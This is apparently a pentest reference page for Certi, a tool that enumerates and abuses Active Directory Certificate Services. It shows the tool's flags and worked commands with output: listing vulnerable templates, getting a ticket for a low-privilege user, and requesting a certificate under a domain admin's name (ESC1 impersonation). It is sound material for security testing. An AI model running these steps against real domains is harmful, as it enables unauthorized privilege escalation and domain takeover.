---
title : "Certi"
# pre : ' '
description : "Utility to play with ADCS, allows to request tickets and collect information about related objects."
date : 2022-01-20T11:04:12+01:00
# hidden : true
# draft : true
weight : 260
tags : ['Other', 'Active Directory', 'ADCS']
---

---

Utility to play with ADCS, allows to request tickets and collect information about related objects. Basically, it's the impacket copy of [Certify](https://github.com/GhostPack/Certify). Thanks to [@harmj0y](https://twitter.com/harmj0y) and [@tifkin_](https://twitter.com/tifkin_) for [its great work with ADCS](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf).

## Installation

```plain
git clone https://github.com/zer1t0/certi
cd certi
python3 setup.py install
```

### List

### Usage list

```plain
certi.py list [-h] [--dc-ip IP] [-k] [-n] [--class [{template,ca,service,ntauth} ...]] [--aes hex key] [--enabled] [--vuln] [--temp-name TEMP_NAME [TEMP_NAME ...]] [--temp-filter TEMP_FILTER]
                     [--hashes LMHASH:NTHASH]
                     target
```

### Flags list

```plain
positional arguments:
  target                domain/username[:password]

options:
  -h, --help            show this help message and exit
  --dc-ip IP            IP address of domain controller
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line
  -n, --no-pass         don't ask for password (useful for -k)
  --class [{template,ca,service,ntauth} ...]
                        Classes to retrieve
  --aes hex key         AES key to use for Kerberos Authentication (128 or 256 bits)
  --enabled             Show only templates that are used by some enroll service
  --vuln                Show only templates with vulnerable configurations
  --temp-name TEMP_NAME [TEMP_NAME ...]
                        Request only template with the given name
  --temp-filter TEMP_FILTER
                        LDAP filter for templates
  --hashes LMHASH:NTHASH
                        LM and NT hashes, format is LMHASH:NTHASH
```

### Req

### Req usage

```plain
usage: certi.py req [-h] [--dc-ip IP] [-t TEMPLATE] [--hashes LMHASH:NTHASH] [--aes hex key] [-k] [-n] [-P CERT_PASS] [-a ALT_NAME] [-o filename] [--on-behalf name] [--enroll-cert ENROLL_CERT]
                    [--enroll-cert-pw ENROLL_CERT_PW] [-2]
                    target service
```

### Req flags

```plain
positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  service               Enrollment service endpoint

options:
  -h, --help            show this help message and exit
  --dc-ip IP            IP address of domain controller
  -t TEMPLATE, --template TEMPLATE
                        Name of the template to enroll
  --hashes LMHASH:NTHASH
                        LM and NT hashes, format is LMHASH:NTHASH
  --aes hex key         AES key to use for Kerberos Authentication (128 or 256 bits)
  -k, --kerberos        Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line
  -n, --no-pass         don't ask for password (useful for -k)
  -P CERT_PASS, --cert-pass CERT_PASS
                        Password for the retrieved certificate
  -a ALT_NAME, --alt-name ALT_NAME
                        Alternative username to specify in certificate (allows impersonation)
  -o filename, --out-cert filename
                        Filename to save the requested certificate
  --on-behalf name      User to ask certificate as agent
  --enroll-cert ENROLL_CERT
                        Enrollment agent certificate
  --enroll-cert-pw ENROLL_CERT_PW
                        Password of enrollment agent certificate
  -2, --version2        Use WCCE version 2
```

## Examples

### Listing vulnerable templates

```plain
$ certi.py list 'offsec.nl/johndo-lowpriv' --dc-ip DC01PKI.offsec.nl --vuln --enable
Password:
[*] Templates

Name: User
Schema Version: 1
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
msPKI-Certificate-Name-Flag: (0x-5a000000) SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
msPKI-Enrollment-Flag: (0x29) INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
msPKI-RA-Signature: 0
pKIExtendedKeyUsage: Encrypting File System, Secure Email, Client Authentication
SD Owner: S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
[...]

Name: Administrator
Schema Version: 1
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC3.2 - Use Agent Certificate
msPKI-Certificate-Name-Flag: (0x-5a000000) SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
msPKI-Enrollment-Flag: (0x29) INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
msPKI-RA-Signature: 0
pKIExtendedKeyUsage: Microsoft Trust List Signing, Encrypting File System, Secure Email, Client Authentication
SD Owner: S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
[...]

Name: UsersOffsecAD
Schema Version: 2
Enroll Services: offsec-DC01PKI-CA
Vulnerabilities: ESC1 - SAN Impersonation
msPKI-Certificate-Name-Flag: (0x1) ENROLLEE_SUPPLIES_SUBJECT
msPKI-Enrollment-Flag: (0x9) INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
msPKI-RA-Signature: 0
pKIExtendedKeyUsage: Client Authentication
msPKI-Certificate-Application-Policy: Client Authentication
SD Owner: S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
Permissions
  Enrollment Permissions
    Enrollment Rights
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
      S-1-5-21-497837788-612300594-3587273769-513 offsec\Domain Users
  Write Permissions
    Write Owner
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
    Write DACL
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
    Write Property
      S-1-5-21-497837788-612300594-3587273769-519 offsec\Enterprise Admins
      S-1-5-21-497837788-612300594-3587273769-500 offsec\Administrator
      S-1-5-21-497837788-612300594-3587273769-512 offsec\Domain Admins
      S-1-5-21-497837788-612300594-3587273769-513 offsec\Domain Users
```

### Requesting ticket for low-priv user

```plain
getTGT.py 'offsec.nl/johndo-lowpriv:Welkom1234'
```

Making the ticket available:

```plain
export KRB5CCNAME=johndo-lowpriv.ccache
```

### Requesting certificate with alternative name

To find the exact Certificate Authority (CA) use `certutil –config – -ping` in CMD (<https://www.cloudservus.com/blog/how-to-find-a-certificate-authority-in-your-active-directory-environment>).

```plain
python3 certi.py req 'offsec.nl/johndo-lowpriv@DC01PKI.offsec.nl' offsec-DC01PKI-CA -k -n --alt-name johnDomainAdmin --template UsersOffsecAD
[*] Service: offsec-DC01PKI-CA
[*] Template: UsersOffsecAD
[*] Username: johndo-lowpriv
[*] Alternative Name: johnDomainAdmin

[*] Response: 0x3 Issued

[*] Cert subject: CN=johndo-lowpriv
[*] Cert issuer: CN=offsec-DC01PKI-CA,DC=offsec,DC=local
[*] Cert Serial: 1300000820BF3CEC69D8FEB673000200000820
[*] Cert Extended Key Usage: Client Authentication
[+] Cert Altname: johnDomainAdmin@offsec.nl

[*] Saving certificate in johnDomainAdmin@offsec.nl.pfx (password: admin)
```

For further steps on how to abuse AD CS, checkout [Abuse AD CS]({{< ref "abuse-adcs" >}})

## URL List

- [Github.com - Certi](https://github.com/zer1t0/certi)
